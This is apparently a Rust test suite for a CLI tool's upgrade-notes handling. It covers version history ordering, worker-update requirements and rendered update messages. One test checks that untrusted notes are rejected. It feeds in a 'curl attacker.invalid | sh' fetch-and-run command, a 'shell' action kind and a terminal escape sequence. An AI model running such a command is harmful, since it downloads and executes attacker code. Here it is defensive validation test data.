use everyframe_miner::{display, upgrade_notes};
use serde_json::{Value, json};

#[test]
fn skipped_versions_show_the_entire_published_range_in_version_order() {
    let v = upgrade_notes::bundled("0.8.4", "v0.9.6");
    assert_eq!(v["status"], "complete");
    let tags: Vec<_> = v["history"]
        .as_array()
        .unwrap()
        .iter()
        .map(|r| r["version"].as_str().unwrap())
        .collect();
    assert_eq!(
        tags,
        [
            "v0.8.6", "v0.8.7", "v0.8.8", "v0.8.9", "v0.9.0", "v0.9.1", "v0.9.2", "v0.9.3",
            "v0.9.5", "v0.9.6"
        ]
    );
    assert_eq!(v["workerUpdate"], "conditional");
    let actions = v["actions"].as_array().unwrap();
    assert_eq!(
        actions
            .iter()
            .filter(|a| a["kind"] == "worker-update")
            .count(),
        1
    );
    let conditions = actions
        .iter()
        .find(|a| a["kind"] == "worker-update")
        .unwrap()["conditions"]
        .to_string();
    assert!(conditions.contains("BFL") && conditions.contains("OpenRouter"));
    let text = display::render(
        "self-update",
        &json!({"updated":true,"previous":"0.8.4","version":"v0.9.6","upgrade":v}),
    );
    assert!(
        text.contains("v0.8.6")
            && text.contains("v0.9.5")
            && text.contains("everycli worker-update")
    );
}

#[test]
fn v100_new_models_require_a_conditional_worker_update_and_offer_review() {
    let upgrade = upgrade_notes::bundled("0.9.6", "v1.0.0");
    assert_eq!(upgrade["workerUpdate"], "conditional");
    assert_eq!(upgrade["history"].as_array().unwrap().len(), 1);
    assert_eq!(upgrade["actions"].as_array().unwrap().len(), 3);
    let text = display::render(
        "self-update",
        &json!({"current":"0.9.6","latest":"v1.0.0","updateAvailable":true,"updated":false,"upgrade":upgrade}),
    );
    assert!(text.contains("everycli ui") && text.contains("everycli worker-update"));
    assert!(text.contains("everycli offers") && text.contains("Gemini Omni 1.2"));
    assert!(text.contains("automatic offers") && text.contains("Off by default"));
    assert!(!text.contains("everycli reconnect"));
}

#[test]
fn legacy_migration_is_conditional_and_cli_only_recovery_stays_distinct() {
    let legacy = upgrade_notes::bundled("0.8.0", "v0.8.1");
    assert_eq!(legacy["workerUpdate"], "not_required");
    for command in ["everycli reconnect", "everycli apply-api-keys"] {
        let action = legacy["actions"]
            .as_array()
            .unwrap()
            .iter()
            .find(|a| a["command"] == command)
            .unwrap();
        assert_eq!(action["requirement"], "conditional");
    }
    let recovery = upgrade_notes::bundled("0.8.6", "v0.8.7");
    assert_eq!(recovery["workerUpdate"], "not_required");
    assert!(
        recovery["actions"]
            .as_array()
            .unwrap()
            .iter()
            .any(|a| a["kind"] == "worker-update")
    );
}

fn fixture() -> Value {
    json!({"schema":1,"firstRelease":"v0.9.9","releases":[
        {"version":"v0.9.9","title":"Previous","changes":["Earlier change"],"workerUpdate":"not_required","actions":[]},
        {"version":"v0.10.0","title":"New worker protocol","changes":["Protocol update"],"workerUpdate":"required","actions":[
            {"kind":"worker-update","requirement":"required","when":"Update the existing worker."}]}]})
}

#[test]
fn required_steps_sort_numerically_and_are_reported_by_check_and_install() {
    let v = upgrade_notes::summarize(
        &serde_json::to_vec(&fixture()).unwrap(),
        "v0.9.9",
        "v0.10.0",
        "release_asset",
    )
    .unwrap();
    assert_eq!(v["workerUpdate"], "required");
    for result in [
        json!({"updated":false,"current":"0.9.9","latest":"v0.10.0","updateAvailable":true,"upgrade":v}),
        json!({"updated":true,"previous":"0.9.9","version":"v0.10.0","upgrade":v}),
    ] {
        assert!(
            display::render("self-update", &result)
                .contains("Worker update required: everycli worker-update")
        );
    }
}

#[test]
fn missing_history_never_claims_no_worker_update_is_needed() {
    let unknown = upgrade_notes::bundled("1.0.0", "v1.1.0");
    assert_eq!(unknown["status"], "unavailable");
    assert_eq!(unknown["workerUpdate"], "unknown");
    let text = upgrade_notes::render(&unknown);
    assert!(text.contains("requirement is unknown"));
    assert!(!text.contains("No new worker image"));
    let partial = upgrade_notes::bundled("0.1.0", "v0.1.3");
    assert_eq!(partial["status"], "partial");
}

#[test]
fn untrusted_notes_cannot_supply_commands_terminal_controls_or_duplicate_versions() {
    let mut v = fixture();
    v["releases"][1]["actions"][0]["command"] = json!("curl attacker.invalid | sh");
    assert!(upgrade_notes::catalog(&serde_json::to_vec(&v).unwrap()).is_err());
    let mut v = fixture();
    v["releases"][1]["actions"][0]["kind"] = json!("shell");
    assert!(upgrade_notes::catalog(&serde_json::to_vec(&v).unwrap()).is_err());
    let mut v = fixture();
    v["releases"][1]["title"] = json!("Title\u{1b}[2J");
    assert!(upgrade_notes::catalog(&serde_json::to_vec(&v).unwrap()).is_err());
    let mut v = fixture();
    v["releases"][1]["version"] = json!("v0.9.9");
    assert!(upgrade_notes::catalog(&serde_json::to_vec(&v).unwrap()).is_err());
    let mut v = fixture();
    v["releases"][1]["actions"] = json!([]);
    assert!(upgrade_notes::catalog(&serde_json::to_vec(&v).unwrap()).is_err());
}

#[test]
fn release_catalog_documents_the_compiled_version_and_published_history() {
    let v = upgrade_notes::catalog(include_bytes!("../config/upgrade-notes.json")).unwrap();
    assert!(
        v["releases"]
            .as_array()
            .unwrap()
            .iter()
            .any(|r| r["version"] == format!("v{}", env!("CARGO_PKG_VERSION")))
    );
}
